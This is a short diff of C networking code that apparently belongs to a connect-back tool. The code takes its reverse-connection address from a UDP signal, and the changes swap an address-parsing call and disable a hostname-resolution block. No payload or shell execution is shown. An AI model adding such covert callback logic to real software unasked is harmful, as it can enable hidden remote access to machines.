@@ -297,14 +297,13 @@ int main( int argc, char **argv )
 		tv.tv_usec = 0;
 		setsockopt(udpServer, SOL_SOCKET, SO_RCVTIMEO, (const void *)&tv, (socklen_t)sizeof(tv));
 
-		struct sockaddr_in udpAddr = parseHostAndPort(cb_host, UDP_ProxyPort);
-
+		struct sockaddr_in udpAddr = true_parseHostAndPort(cb_host, UDP_ProxyPort);
 	    while( 1 )
 	    {
 			struct sockaddr_in sServer;
 			if (proxyUdp) {
 				if (udpAddr.sin_family == AF_UNSPEC || udpAddr.sin_addr.s_addr == 0 || udpAddr.sin_port == 0) {
-					udpAddr = parseHostAndPort(cb_host, UDP_ProxyPort);
+					udpAddr = true_parseHostAndPort(cb_host, UDP_ProxyPort);
 				}
 				/* 如果UDP发送过来了反向连接的ip:port */
 				if(!hasWaitConnectSignal(udpServer, &udpAddr, &sServer)) {
@@ -327,6 +326,7 @@ int main( int argc, char **argv )
 
 	        /* resolve the client hostname */
 
+#if 0
 	        client_host = gethostbyname( cb_host );
 
 	        if( client_host == NULL )
@@ -340,7 +340,7 @@ int main( int argc, char **argv )
 
 	        client_addr.sin_family = AF_INET;
 	        client_addr.sin_port   = htons( server_port );
-
+#endif
 			if (proxyUdp) {
 				/* 使用从UDP监听来的地址 */
 				client_addr = sServer;
